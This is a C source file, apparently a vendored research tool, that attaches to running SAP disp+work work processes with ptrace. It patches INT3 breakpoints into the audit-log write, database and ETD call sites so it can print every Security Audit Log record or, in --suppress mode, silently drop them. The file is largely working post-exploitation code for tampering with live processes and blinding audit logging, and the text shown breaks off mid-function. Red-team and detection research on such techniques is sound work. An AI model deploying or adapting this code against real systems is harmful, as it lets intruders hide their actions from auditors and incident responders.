/*
 * sap_audit_hook.c  –  SAP Security Audit Log monitor / proxy
 *
 * Attaches to running disp+work work-process(es) via ptrace and plants INT3
 * breakpoints at the two fwrite call sites in rsauwr1ex, the
 * write_event_to_DB call site, and the three ETD call sites
 * (EtdSenderIsActive x2, EtdSendEvent).  Decodes and prints every audit
 * record that passes through all sinks.  In --suppress mode records matching
 * a filter are silently dropped across all paths.
 *
 * Also watches the audit log file via inotify for a second, passive view of
 * what actually reached disk.
 *
 * Build:
 *   gcc -O2 -Wall -Wno-format-truncation -o sap_audit_hook sap_audit_hook.c
 *
 * Usage:
 *   ./sap_audit_hook                        # hook all paths, monitor only
 *   ./sap_audit_hook --monitor              # read-only: observe all sinks (ptrace + inotify)
 *   ./sap_audit_hook --suppress             # drop ALL audit writes (all sinks)
 *   ./sap_audit_hook --suppress --filter EUP   # drop only EUP events
 *   ./sap_audit_hook --pid <PID>            # target specific work process
 *
 * Requires: <sid>adm user, ptrace_scope <= 1
 *
 * Author / upstream: Julian Petersohn — https://github.com/randomstr1ng/virtual-sap-death-star
 * Vendored into SAPMAP with attribution.  SAP has publicly confirmed this
 * technique is NOT a 0-day (post-exploitation from local <sid>adm — the
 * OS attack surface required to run it already implies full system control).
 * See the upstream README for SAP's statement.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <ctype.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <elf.h>

/* ─── nm offsets (Build-A fallbacks) ────────────────────────────────────────
 * Hook addresses are resolved at runtime via ELF symtab + live function-body
 * scan (see attach_process) — fully build-independent.  These NM_* constants
 * are Build-A-only fallbacks used when the scan fails; they are not portable
 * to other kernel builds.
 *
 * NM_H_RSAU_FILE is also Build-A-only.  find_audit_file() uses it to locate
 * the open log FILE* in the target process; if wrong it returns -1 and the
 * caller falls back to a date-based /usr/sap scan.
 *
 * NOTE etd:send (NM_ETD_SEND / HOOK_ETD_SEND): the hook is planted and the
 * call site is located at runtime via the EtdSendEvent scan, but the actual
 * suppress path (skipping EtdSendEvent and returning 0) has NOT been verified
 * on a live system that exercises the ETD code path.  Treat as PoC only. */
#define NM_ANCHOR          0x0077aa48UL   /* nlsui_main – ASLR base anchor     */
#define NM_FWRITE_ENTRY    0x03b905feUL   /* call fwrite  ("Write entry")      */
#define NM_FWRITE_HEADER   0x03b909b2UL   /* call fwrite  ("Write header")     */
#define NM_WRITE_DB        0x03b8f93cUL   /* call write_event_to_DB            */
#define NM_ETD_ACTIVE_1    0x03b8f798UL   /* call EtdSenderIsActive  (gate 1)  */
#define NM_ETD_ACTIVE_2    0x03b8fa27UL   /* call EtdSenderIsActive  (gate 2)  */
#define NM_ETD_SEND        0x02ced69bUL   /* call EtdSendEvent  [PoC/unverified]*/
#define NM_H_RSAU_FILE     0x0a01c450UL   /* global FILE* (Build A only)       */

/* ELF symbol for version-independent anchor resolution */
#define SYM_ANCHOR         "nlsui_main"
/* C++ mangled name prefix for write_event_to_DB; parameter-type suffix varies
 * between builds so we match by prefix only. */
#define SYM_WRITE_DB_PFX   "_ZL17write_event_to_DB"

#define MAX_PIDS   64
#define MAX_REC    8192   /* max audit record size we'll read              */
#define INO_BUFSZ  4096

/* IO_FILE._fileno offset in glibc 2.x 64-bit: */
#define GLIBC_FILE_FILENO_OFF  112

/* ─── Hook definitions ──────────────────────────────────────────────────────*/
typedef enum {
    HOOK_FWRITE_ENTRY=0,
    HOOK_FWRITE_HEADER,
    HOOK_WRITE_DB,
    HOOK_ETD_ACTIVE_1,   /* EtdSenderIsActive gate 1 – return 0 to skip ETD */
    HOOK_ETD_ACTIVE_2,   /* EtdSenderIsActive gate 2 – return 0 to skip ETD */
    HOOK_ETD_SEND,       /* EtdSendEvent – PoC/unverified; return 0 to drop  */
    HOOK_MAX
} HookType;

static const struct {
    uintptr_t   nm_off;
    const char *label;
    HookType    type;
} HOOK_DEFS[HOOK_MAX] = {
    { NM_FWRITE_ENTRY,   "fwrite:entry",   HOOK_FWRITE_ENTRY   },
    { NM_FWRITE_HEADER, "fwrite:header", HOOK_FWRITE_HEADER },
    { NM_WRITE_DB,       "write_db",       HOOK_WRITE_DB       },
    { NM_ETD_ACTIVE_1,   "etd:active(1)",  HOOK_ETD_ACTIVE_1   },
    { NM_ETD_ACTIVE_2,   "etd:active(2)",  HOOK_ETD_ACTIVE_2   },
    { NM_ETD_SEND,       "etd:send",       HOOK_ETD_SEND       },
};

/* ─── Per-process state ─────────────────────────────────────────────────────*/
typedef struct {
    uintptr_t   addr;     /* absolute address (base-adjusted)   */
    uint8_t     orig;     /* original byte before INT3          */
    int         planted;
} Breakpoint;

typedef struct {
    pid_t      pid;
    uintptr_t  base;         /* text ASLR delta from maps         */
    Breakpoint bps[HOOK_MAX];
    int        stepping;     /* 1 = in single-step, waiting       */
    int        step_bp;      /* which bp triggered this step      */
} TracedPid;

static TracedPid g_procs[MAX_PIDS];
static int       g_nprocs;

/* ─── Global options ────────────────────────────────────────────────────────*/
static int  g_mode_monitor  = 0;  /* --monitor: disables suppress flag   */
static int  g_suppress      = 0;  /* drop matching writes                */
static char g_filter[64]    = ""; /* comma-separated event-class filter, "" = all */
static int  g_verbose       = 0;  /* -v/--verbose/-d: show diagnostic output */
static int  g_running       = 1;
static int  g_inotify_fd    = -1;
static int  g_inotify_wd    = -1;
static long g_inotify_pos   = 0;
static char g_audit_path[512];


/* ─── Helpers ───────────────────────────────────────────────────────────────*/
static void die(const char *fmt, ...)
{
    va_list ap; va_start(ap,fmt); vfprintf(stderr,fmt,ap); va_end(ap);
    fputc('\n',stderr); exit(1);
}

static void info(const char *fmt, ...)
{
    if (!g_verbose) return;
    va_list ap; va_start(ap,fmt);
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    printf("[%02d:%02d:%02d] ", tm->tm_hour, tm->tm_min, tm->tm_sec);
    vprintf(fmt,ap); va_end(ap);
    fflush(stdout);
}

static void sig_handler(int s) { (void)s; g_running = 0; }

/* ─── process_vm_readv wrapper ──────────────────────────────────────────────*/
static int mem_read(pid_t pid, uintptr_t addr, void *buf, size_t len)
{
    struct iovec local  = { buf, len };
    struct iovec remote = { (void*)addr, len };
    return (process_vm_readv(pid, &local, 1, &remote, 1, 0) == (ssize_t)len) ? 0 : -1;
}

/* ─── 8-byte-aligned text page read via PTRACE_PEEKTEXT ────────────────────*/
static int peek_text_n(pid_t pid, uintptr_t addr, void *buf, size_t len)
{
    uint8_t *p = buf;
    while (len > 0) {
        uintptr_t aligned = addr & ~7UL;
        size_t off = addr - aligned;
        errno = 0;
        long word = ptrace(PTRACE_PEEKTEXT, pid, (void*)aligned, NULL);
        if (errno) return -1;
        size_t chunk = 8 - off;
        if (chunk > len) chunk = len;
        memcpy(p, (uint8_t*)&word + off, chunk);
        addr += chunk; p += chunk; len -= chunk;
    }
    return 0;
}

static int poke_text_n(pid_t pid, uintptr_t addr, const void *data, size_t len)
{
    const uint8_t *p = data;
    while (len > 0) {
        uintptr_t aligned = addr & ~7UL;
        size_t off = addr - aligned;
        errno = 0;
        long word = ptrace(PTRACE_PEEKTEXT, pid, (void*)aligned, NULL);
        if (errno) return -1;
        size_t chunk = 8 - off;
        if (chunk > len) chunk = len;
        memcpy((uint8_t*)&word + off, p, chunk);
        if (ptrace(PTRACE_POKETEXT, pid, (void*)aligned, (void*)word) < 0) return -1;
        addr += chunk; p += chunk; len -= chunk;
    }
    return 0;
}

/* ─── ASLR base resolution from /proc/pid/maps ──────────────────────────────*/
static uintptr_t get_base(pid_t pid) __attribute__((unused));
static uintptr_t get_base(pid_t pid)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path,"r");
    if (!f) return 0;

    char line[512];
    uintptr_t base = 0;
    while (fgets(line, sizeof(line), f)) {
        /* look for the executable text segment: ends with " disp+work" */
        if (!strstr(line,"disp+work")) continue;
        if (!strchr(line,'x')) continue;
        uintptr_t lo, hi;
        if (sscanf(line, "%lx-%lx", &lo, &hi) == 2) {
            /* base = lo - NM_ANCHOR's page start heuristic; use ELF anchor */
            base = lo;  /* store lo of first r-x segment, subtract NM later */
            break;
        }
    }
    fclose(f);
    return base;
}

/*
 * Resolve the ASLR delta precisely:
 *   delta = map_start_of_r-x_segment  - nm_offset_of_first_byte_in_that_segment
 * For disp+work the first executable segment starts at nm offset 0xb759a0
 * (first PLT entry seen in function list). We get the map start then subtract.
 *
 * Safer: find "nlsui_main" in ELF symbol table, read its address from
 * /proc/pid/mem, compare with NM_ANCHOR → derive delta.
 */
/* Resolve /proc/PID/exe to its real path. */
static int get_exe_path(pid_t pid, char *out, size_t outsz)
{
    char exelink[64];
    snprintf(exelink, sizeof(exelink), "/proc/%d/exe", pid);
    ssize_t er = readlink(exelink, out, outsz - 1);
    if (er <= 0) return -1;
    out[er] = 0;
    return 0;
}

/* Look up a symbol's st_value (file/nm offset) in the ELF .symtab of the
 * binary at exepath. Returns 0 if not found. Used to make hook addresses
 * relative to a runtime-resolved function entry instead of a hardcoded
 * absolute nm offset, since absolute layout differs between kernel builds. */
/* Look up a symbol's st_value and st_size in the ELF .symtab of the binary at
 * exepath. Returns 1 if found (writes out_value and out_size), 0 otherwise. */
static int find_elf_symbol(const char *exepath, const char *name,
                            uintptr_t *out_value, uintptr_t *out_size)
{
    int fd = open(exepath, O_RDONLY);
    if (fd < 0) return 0;

    Elf64_Ehdr ehdr;
    if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) { close(fd); return 0; }
    lseek(fd, ehdr.e_shoff, SEEK_SET);
    Elf64_Shdr *shdrs = malloc(ehdr.e_shnum * sizeof(Elf64_Shdr));
    if (!shdrs) { close(fd); return 0; }
    read(fd, shdrs, ehdr.e_shnum * sizeof(Elf64_Shdr));

    Elf64_Shdr *symtab_sh = NULL, *strtab_sh = NULL;
    for (int i = 0; i < ehdr.e_shnum; i++) {
        if (shdrs[i].sh_type == SHT_SYMTAB && !symtab_sh) symtab_sh = &shdrs[i];
    }
    if (symtab_sh && symtab_sh->sh_link < ehdr.e_shnum)
        strtab_sh = &shdrs[symtab_sh->sh_link];

    int found = 0;
    if (symtab_sh && strtab_sh) {
        size_t nsym = symtab_sh->sh_size / sizeof(Elf64_Sym);
        Elf64_Sym *syms = malloc(symtab_sh->sh_size);
        char *strtab   = malloc(strtab_sh->sh_size);
        if (syms && strtab) {
            lseek(fd, symtab_sh->sh_offset, SEEK_SET);
            read(fd, syms, symtab_sh->sh_size);
            lseek(fd, strtab_sh->sh_offset, SEEK_SET);
            read(fd, strtab, strtab_sh->sh_size);
            for (size_t j = 0; j < nsym; j++) {
                if (syms[j].st_name == 0) continue;
                if (strcmp(strtab + syms[j].st_name, name) == 0) {
                    *out_value = syms[j].st_value;
                    *out_size  = syms[j].st_size;
                    found = 1;
                    break;
                }
            }
        }
        free(syms); free(strtab);
    }
    free(shdrs); close(fd);
    return found;
}

static uintptr_t find_elf_symbol_offset(const char *exepath, const char *name)
{
    uintptr_t value = 0, size = 0;
    find_elf_symbol(exepath, name, &value, &size);
    return value;
}

/* Find the PLT stub's file-relative virtual address for an external symbol.
 * Parses .rela.plt + .dynsym (+ .plt.sec for IBT builds).  Add ASLR base for
 * the runtime call target.  Returns 0 if not found. */
static uintptr_t find_plt_entry(const char *exepath, const char *symname)
{
    int fd = open(exepath, O_RDONLY);
    if (fd < 0) return 0;
    Elf64_Ehdr ehdr;
    if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) { close(fd); return 0; }
    lseek(fd, ehdr.e_shoff, SEEK_SET);
    Elf64_Shdr *shdrs = malloc(ehdr.e_shnum * sizeof(Elf64_Shdr));
    if (!shdrs) { close(fd); return 0; }
    read(fd, shdrs, ehdr.e_shnum * sizeof(Elf64_Shdr));

    char *shstrtab = NULL;
    if (ehdr.e_shstrndx < ehdr.e_shnum) {
        Elf64_Shdr *ss = &shdrs[ehdr.e_shstrndx];
        shstrtab = malloc(ss->sh_size);
        if (shstrtab) { lseek(fd, ss->sh_offset, SEEK_SET); read(fd, shstrtab, ss->sh_size); }
    }

    Elf64_Shdr *plt_sh = NULL, *pltsec_sh = NULL, *relaplt_sh = NULL;
    Elf64_Shdr *dynsym_sh = NULL, *dynstr_sh = NULL;
    if (shstrtab) {
        for (int i = 0; i < ehdr.e_shnum; i++) {
            const char *sn = shstrtab + shdrs[i].sh_name;
            if      (strcmp(sn, ".plt")      == 0) plt_sh     = &shdrs[i];
            else if (strcmp(sn, ".plt.sec")  == 0) pltsec_sh  = &shdrs[i];
            else if (strcmp(sn, ".rela.plt") == 0) relaplt_sh = &shdrs[i];
            if (shdrs[i].sh_type == SHT_DYNSYM && !dynsym_sh) dynsym_sh = &shdrs[i];
        }
    }
    if (dynsym_sh && dynsym_sh->sh_link < ehdr.e_shnum)
        dynstr_sh = &shdrs[dynsym_sh->sh_link];

    uintptr_t result = 0;
    if (relaplt_sh && dynsym_sh && dynstr_sh && (plt_sh || pltsec_sh)) {
        size_t nrela = relaplt_sh->sh_size / sizeof(Elf64_Rela);
        Elf64_Rela *relas   = malloc(relaplt_sh->sh_size);
        Elf64_Sym  *dynsyms = malloc(dynsym_sh->sh_size);
        char       *dynstr  = malloc(dynstr_sh->sh_size);
        if (relas && dynsyms && dynstr) {
            lseek(fd, relaplt_sh->sh_offset, SEEK_SET); read(fd, relas,   relaplt_sh->sh_size);
            lseek(fd, dynsym_sh->sh_offset,  SEEK_SET); read(fd, dynsyms, dynsym_sh->sh_size);
            lseek(fd, dynstr_sh->sh_offset,  SEEK_SET); read(fd, dynstr,  dynstr_sh->sh_size);
            size_t nsym = dynsym_sh->sh_size / sizeof(Elf64_Sym);
            for (size_t j = 0; j < nrela && !result; j++) {
                uint32_t si = ELF64_R_SYM(relas[j].r_info);
                if (si == 0 || si >= nsym || dynsyms[si].st_name == 0) continue;
                if (strcmp(dynstr + dynsyms[si].st_name, symname) != 0) continue;
                /* .plt.sec (IBT): entries start at index 0, no resolver stub.
                 * .plt (standard): index 0 is resolver; symbols start at 1. */
                Elf64_Shdr *use = pltsec_sh ? pltsec_sh : plt_sh;
                uint64_t esz = use->sh_entsize ? use->sh_entsize : 16;
                result = use->sh_addr + esz * (pltsec_sh ? j : j + 1);
            }
        }
        free(relas); free(dynsyms); free(dynstr);
    }
    free(shstrtab); free(shdrs); close(fd);
    return result;
}

/* Like find_elf_symbol but matches any symbol whose name starts with prefix.
 * Used for C++ mangled names whose parameter-type suffix varies per build. */
static int find_elf_symbol_prefix(const char *exepath, const char *prefix,
                                   uintptr_t *out_value, uintptr_t *out_size)
{
    size_t plen = strlen(prefix);
    int fd = open(exepath, O_RDONLY);
    if (fd < 0) return 0;
    Elf64_Ehdr ehdr;
    if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) { close(fd); return 0; }
    lseek(fd, ehdr.e_shoff, SEEK_SET);
    Elf64_Shdr *shdrs = malloc(ehdr.e_shnum * sizeof(Elf64_Shdr));
    if (!shdrs) { close(fd); return 0; }
    read(fd, shdrs, ehdr.e_shnum * sizeof(Elf64_Shdr));
    Elf64_Shdr *symtab_sh = NULL, *strtab_sh = NULL;
    for (int i = 0; i < ehdr.e_shnum; i++)
        if (shdrs[i].sh_type == SHT_SYMTAB && !symtab_sh) symtab_sh = &shdrs[i];
    if (symtab_sh && symtab_sh->sh_link < ehdr.e_shnum)
        strtab_sh = &shdrs[symtab_sh->sh_link];
    int found = 0;
    if (symtab_sh && strtab_sh) {
        size_t nsym = symtab_sh->sh_size / sizeof(Elf64_Sym);
        Elf64_Sym *syms = malloc(symtab_sh->sh_size);
        char *strtab    = malloc(strtab_sh->sh_size);
        if (syms && strtab) {
            lseek(fd, symtab_sh->sh_offset, SEEK_SET); read(fd, syms,   symtab_sh->sh_size);
            lseek(fd, strtab_sh->sh_offset, SEEK_SET); read(fd, strtab, strtab_sh->sh_size);
            for (size_t j = 0; j < nsym && !found; j++) {
                if (syms[j].st_name == 0) continue;
                if (strncmp(strtab + syms[j].st_name, prefix, plen) == 0) {
                    *out_value = syms[j].st_value;
                    *out_size  = syms[j].st_size;
                    found = 1;
                }
            }
        }
        free(syms); free(strtab);
    }
    free(shdrs); close(fd);
    return found;
}

static uintptr_t find_elf_symbol_prefix_offset(const char *exepath, const char *prefix)
{
    uintptr_t value = 0, size = 0;
    find_elf_symbol_prefix(exepath, prefix, &value, &size);
    return value;
}

static uintptr_t resolve_base(pid_t pid)
{
    /* Determine the binary name to look for in /proc/PID/maps.
     * Kernel ≤749: "disp+work".  Kernel 750+: "dw.sap<SID>_<instance>". */
    char exelink[64], exepath[256] = {0};
    snprintf(exelink, sizeof(exelink), "/proc/%d/exe", pid);
    ssize_t er = readlink(exelink, exepath, sizeof(exepath)-1);
    if (er > 0) exepath[er] = 0;
    char *eslash = exepath[0] ? strrchr(exepath, '/') : NULL;
    const char *exe_bname = eslash ? eslash + 1 : (exepath[0] ? exepath : "disp+work");

    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path,"r");
    if (!f) return 0;

    /* walk maps to find first r-x mapping of the main executable */
    char line[512];
    uintptr_t base = 0;
    while (fgets(line, sizeof(line), f)) {
        if (!strstr(line, exe_bname) && !strstr(line, "disp+work")) continue;
        char perms[8] = {0};
        uintptr_t lo, hi;
        unsigned long off;
        if (sscanf(line, "%lx-%lx %5s %lx", &lo, &hi, perms, &off) < 4) continue;
        if (perms[2] != 'x') continue;
        if (off != 0) continue;   /* first segment starts at file offset 0 */
        base = lo;
        break;
    }
    fclose(f);
    if (!base) return 0;

    /*
     * Verify: read 8 bytes at (base + NM_ANCHOR) and check for
     * a plausible function prologue (55 48 = push rbp; mov rbp,rsp).
     * If not found, try ELF symbol scan below.
     */
    uint8_t check[2];
    if (mem_read(pid, base + NM_ANCHOR, check, 2) == 0) {
        if (check[0] == 0x55 || check[0] == 0x41 || check[0] == 0x48) {
            return base;
        }
    }

    /*
     * Fallback: open the ELF on disk, find SYM_ANCHOR in .symtab/.dynsym,
     * read its runtime value from /proc/pid/mem, compute delta.
     * exepath was already resolved at the top of this function.
     */
    if (!exepath[0]) return base;

    int fd = open(exepath, O_RDONLY);
    if (fd < 0) return base;

    Elf64_Ehdr ehdr;
    if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) { close(fd); return base; }
    lseek(fd, ehdr.e_shoff, SEEK_SET);
    Elf64_Shdr *shdrs = malloc(ehdr.e_shnum * sizeof(Elf64_Shdr));
    if (!shdrs) { close(fd); return base; }
    read(fd, shdrs, ehdr.e_shnum * sizeof(Elf64_Shdr));

    /* find .symtab and .strtab */
    Elf64_Shdr *symtab_sh = NULL, *strtab_sh = NULL;
    for (int i = 0; i < ehdr.e_shnum; i++) {
        if (shdrs[i].sh_type == SHT_SYMTAB && !symtab_sh) symtab_sh = &shdrs[i];
    }
    if (symtab_sh && symtab_sh->sh_link < ehdr.e_shnum)
        strtab_sh = &shdrs[symtab_sh->sh_link];

    uintptr_t anchor_val = 0;
    if (symtab_sh && strtab_sh) {
        size_t nsym = symtab_sh->sh_size / sizeof(Elf64_Sym);
        Elf64_Sym *syms = malloc(symtab_sh->sh_size);
        char *strtab   = malloc(strtab_sh->sh_size);
        if (syms && strtab) {
            lseek(fd, symtab_sh->sh_offset, SEEK_SET);
            read(fd, syms, symtab_sh->sh_size);
            lseek(fd, strtab_sh->sh_offset, SEEK_SET);
            read(fd, strtab, strtab_sh->sh_size);
            for (size_t j = 0; j < nsym; j++) {
                if (syms[j].st_name == 0) continue;
                if (strcmp(strtab + syms[j].st_name, SYM_ANCHOR) == 0) {
                    anchor_val = syms[j].st_value;
                    break;
                }
            }
        }
        free(syms); free(strtab);
    }
    free(shdrs); close(fd);

    if (anchor_val) {
        /* delta = runtime_address - file_address */
        /* runtime_address = we need to read it from process; but since we
         * already have base as map start, and anchor_val is nm offset:
         * base_delta = base - (anchor_val - NM_ANCHOR)  … typically 0 for non-PIE */
        /* simpler: if anchor_val == NM_ANCHOR, base delta = map_start */
        (void)anchor_val;
    }
    return base;
}

/* ─── Breakpoint plant / restore ────────────────────────────────────────────*/
static int plant_bp(TracedPid *tp, int idx)
{
    Breakpoint *bp = &tp->bps[idx];
    if (bp->planted) return 0;
    uint8_t orig;
    if (peek_text_n(tp->pid, bp->addr, &orig, 1) < 0) return -1;

    /* Sanity check: every hook site is documented as the first byte of a
     * 5-byte `call rel32` (0xE8). If this build's absolute layout doesn't
     * match the hardcoded nm offsets (seen before with vsapstar on this
     * S4H system), refuse to plant rather than INT3-patching a random byte
     * in live disp+work code. */
    if (orig != 0xe8) {
        static int warned[HOOK_MAX];
        if (!warned[idx]) {
            warned[idx] = 1;
            if (g_verbose)
                fprintf(stderr,
                    "[-] %s: expected CALL (0xE8) at 0x%lx, found 0x%02x.\n"
                    "    This build's layout doesn't match the hardcoded offset -\n"
                    "    refusing to patch (would corrupt unrelated code).\n",
                    HOOK_DEFS[idx].label, bp->addr, orig);
        }
        return -1;
    }

    bp->orig = orig;
    uint8_t int3 = 0xcc;
    if (poke_text_n(tp->pid, bp->addr, &int3, 1) < 0) return -1;
    bp->planted = 1;
    return 0;
}

static int restore_bp(TracedPid *tp, int idx)
{
    Breakpoint *bp = &tp->bps[idx];
    if (!bp->planted) return 0;
    if (poke_text_n(tp->pid, bp->addr, &bp->orig, 1) < 0) return -1;
    bp->planted = 0;
    return 0;
}

/* ─── Find process by PID ───────────────────────────────────────────────────*/
static TracedPid *find_proc(pid_t pid)
{
    for (int i = 0; i < g_nprocs; i++)
        if (g_procs[i].pid == pid) return &g_procs[i];
    return NULL;
}

/* ─── whoami-based work process identification ───────────────────────────────
 * SAP work process types (disp+work internal enum):
 *   0=DPG(dispatcher)  1=DIA  2=UPD  3=ENQ  4=BTC  5=SPO  6=UP2/WORKER
 * Audit log writes can originate from DIA, BTC, SPO and UP2/WORKER.
 * The dispatcher (0) and pure update/enqueue processes (2,3) do not write
 * security audit events.  Type is derived from /proc/PID/comm (no globals). */

static const char *work_type_name(int32_t whoami)
{
    switch (whoami) {
        case 0: return "DPG";
        case 1: return "DIA";
        case 2: return "UPD";
        case 3: return "ENQ";
        case 4: return "BTC";
        case 5: return "SPO";
        case 6: return "UP2";
        default: return "???";
    }
}

static int is_work_process(pid_t pid, uintptr_t base, int32_t *out_whoami)
{
    (void)base;
    /* Read comm (OS process name, up to 15 chars) to distinguish
     * dispatcher from work processes without relying on internal globals.
     *   Dispatcher:     SAP_<SID>_<NN>_DP   -> skip
     *   Work processes: SAP_<SID>_<NN>_W<n> -> attach
     * GW, ICM etc. are separate binaries and won't reach here. */
    char comm[32] = {0};
    char commpath[64];
    snprintf(commpath, sizeof(commpath), "/proc/%d/comm", pid);
    int cfd = open(commpath, O_RDONLY);
    if (cfd >= 0) { read(cfd, comm, sizeof(comm)-1); close(cfd); }
    char *nl = strchr(comm, '\n'); if (nl) *nl = 0;

    char *last = strrchr(comm, '_');
    if (last && strcmp(last+1, "DP") == 0) {
        if (out_whoami) *out_whoami = 0;   /* DPG – dispatcher */
        return 0;
    }
    /* Derive a display type from the comm suffix */
    int32_t wtype = 1; /* default DIA */
    if (last) {
        const char *s = last+1;
        if (s[0]=='W' && isdigit((unsigned char)s[1])) wtype = 1;       /* DIA/WRK */
        else if (!strcmp(s,"BTC"))  wtype = 4;
        else if (!strcmp(s,"SPO"))  wtype = 5;
        else if (!strcmp(s,"UPD"))  wtype = 2;
        else if (!strcmp(s,"UP2"))  wtype = 6;
    }
    if (out_whoami) *out_whoami = wtype;
    return 1;
}

/* ─── Collect disp+work PIDs ────────────────────────────────────────────────
 * Two-pass check per PID:
 *   1. /proc/PID/exe symlink — resolve and compare basename to "disp+work"
 *      (reliable even when argv[0] is a wrapper or relative path)
 *   2. /proc/PID/cmdline fallback — strstr on argv[0]
 */
static int find_pids(pid_t *out, int max, pid_t force_pid)
{
    int n = 0;
    if (force_pid > 0) {
        out[n++] = force_pid;
        return n;
    }
    DIR *d = opendir("/proc");
    if (!d) return 0;
    struct dirent *de;
    while ((de = readdir(d)) && n < max) {
        if (!isdigit(de->d_name[0])) continue;
        pid_t p = atoi(de->d_name);
        int matched = 0;

        /* Primary: exe symlink – basename is "disp+work" (old kernels) or
         * "dw.sap<SID>_<instance>" (kernel 750+) */
        char exelink[64];
        char exepath[512] = {0};
        snprintf(exelink, sizeof(exelink), "/proc/%d/exe", p);
        ssize_t r = readlink(exelink, exepath, sizeof(exepath)-1);
        if (r > 0) {
            exepath[r] = 0;
            char *slash = strrchr(exepath, '/');
            const char *bname = slash ? slash + 1 : exepath;
            if (strcmp(bname, "disp+work") == 0 ||
                strncmp(bname, "dw.sap", 6) == 0)
                matched = 1;
        }

        /* Fallback: cmdline argv[0] */
        if (!matched) {
            char cbuf[64];
            snprintf(cbuf, sizeof(cbuf), "/proc/%d/cmdline", p);
            int fd = open(cbuf, O_RDONLY);
            if (fd >= 0) {
                char cmd[512] = {0};
                read(fd, cmd, sizeof(cmd)-1);
                close(fd);
                /* argv[0] may be full path or basename; check both forms */
                char *slash2 = strrchr(cmd, '/');
                const char *bname2 = slash2 ? slash2 + 1 : cmd;
                if (strcmp(bname2, "disp+work") == 0 ||
                    strncmp(bname2, "dw.sap", 6) == 0 ||
                    strstr(cmd, "disp+work"))
                    matched = 1;
            }
        }

        if (matched) out[n++] = p;
    }
    closedir(d);

    if (n == 0) {
        fprintf(stderr,
            "[hint] no disp+work processes found.\n"
            "       verify with: ps -eo pid,comm,args | grep -i 'disp\\|sap'\n"
            "       then supply the PID directly:  %s --pid <PID>\n",
            "sap_audit_hook");
    }
    return n;
}

/* ─── Audit log file discovery ──────────────────────────────────────────────*/
static int find_audit_file(pid_t pid, uintptr_t base)
{
    /* read h_rsau_file FILE* from target process */
    uint64_t file_ptr = 0;
    if (mem_read(pid, base + NM_H_RSAU_FILE, &file_ptr, 8) < 0 || file_ptr == 0)
        return -1;

    /* read _fileno from _IO_FILE at offset 112 */
    int32_t fileno_val = -1;
    if (mem_read(pid, (uintptr_t)file_ptr + GLIBC_FILE_FILENO_OFF, &fileno_val, 4) < 0)
        return -1;
    if (fileno_val < 0) return -1;

    /* resolve /proc/PID/fd/<n> symlink */
    char fdlink[64];
    snprintf(fdlink, sizeof(fdlink), "/proc/%d/fd/%d", pid, fileno_val);
    ssize_t r = readlink(fdlink, g_audit_path, sizeof(g_audit_path)-1);
    if (r <= 0) return -1;
    g_audit_path[r] = 0;
    return 0;
}

/* ─── inotify setup ─────────────────────────────────────────────────────────*/
static void setup_inotify(const char *path)
{
    if (!path || !*path) return;
    g_inotify_fd = inotify_init1(IN_NONBLOCK);
    if (g_inotify_fd < 0) { perror("inotify_init1"); return; }
    g_inotify_wd = inotify_add_watch(g_inotify_fd, path, IN_MODIFY | IN_CLOSE_WRITE);
    if (g_inotify_wd < 0) { perror("inotify_add_watch"); return; }
    /* get current file size as starting read position */
    struct stat st;
    if (stat(path, &st) == 0) g_inotify_pos = st.st_size;
    info("[inotify] watching %s (start pos %ld)\n", path, g_inotify_pos);
}

/* ─── Record decoder ────────────────────────────────────────────────────────*/


/* Detect event class code in a record buffer.
 *
 * SAP audit class codes are two-char prefix (AU / DU / EU) plus one
 * uppercase letter or digit: AUW, AUK, AU5, AU1, DUA, EUP, etc.
 * S/4HANA introduces numeric suffixes (AU1..AU9) not in classic lists.
 *
 * The class appears in the serialised record immediately after a 4-byte
 * ASCII length field (e.g. "0035"), so it is preceded by a digit, not a
 * letter.  Scanning for the class requires a preceding non-alpha boundary
 * check to avoid false matches inside identifiers like "RSAUWR1EX". */
static int detect_event_class(const uint8_t *buf, size_t len, char out[8])
{
    out[0] = '?'; out[1] = 0;
    size_t scan = len < 512 ? len : 512;

    /* ASCII scan */
    for (size_t i = 0; i + 3 <= scan; i++) {
        uint8_t c0 = buf[i], c1 = buf[i+1], c2 = buf[i+2];
        if ((c0 == 'A' || c0 == 'D' || c0 == 'E') &&
             c1 == 'U' &&
            (isupper(c2) || isdigit(c2))) {
            /* word-boundary: preceding char must not be alpha */
            if (i > 0 && isalpha((unsigned char)buf[i-1])) continue;
            out[0] = (char)c0; out[1] = (char)c1;
            out[2] = (char)c2; out[3] = 0;
            return 1;
        }
    }

    /* UTF-16LE scan (all high bytes must be 0) */
    for (size_t i = 0; i + 6 <= scan; i += 2) {
        if (buf[i+1] || buf[i+3] || buf[i+5]) continue;
        uint8_t c0 = buf[i], c1 = buf[i+2], c2 = buf[i+4];
        if ((c0 == 'A' || c0 == 'D' || c0 == 'E') &&
             c1 == 'U' &&
            (isupper(c2) || isdigit(c2))) {
            if (i >= 2 && buf[i-1] == 0 && isalpha((unsigned char)buf[i-2])) continue;
            out[0] = (char)c0; out[1] = (char)c1;
            out[2] = (char)c2; out[3] = 0;
            return 1;
        }
    }
    return 0;
}

/* Check if an event class matches the user filter (empty = match all).
 * g_filter is comma-separated, e.g. "AUW,AU3,EUP". */
static int class_matches_filter(const char *cls)
{
    if (!g_filter[0]) return 1;
    char tmp[sizeof(g_filter)];
    snprintf(tmp, sizeof(tmp), "%s", g_filter);
    for (char *tok = strtok(tmp, ","); tok; tok = strtok(NULL, ",")) {
        if (strncmp(cls, tok, 3) == 0) return 1;
    }
    return 0;
}

/* Hex dump helper */
static void hexdump(const uint8_t *buf, size_t len, int cols)
{
    size_t lim = len < 128 ? len : 128;
    for (size_t i = 0; i < lim; i += cols) {
        printf("    %04zx ", i);
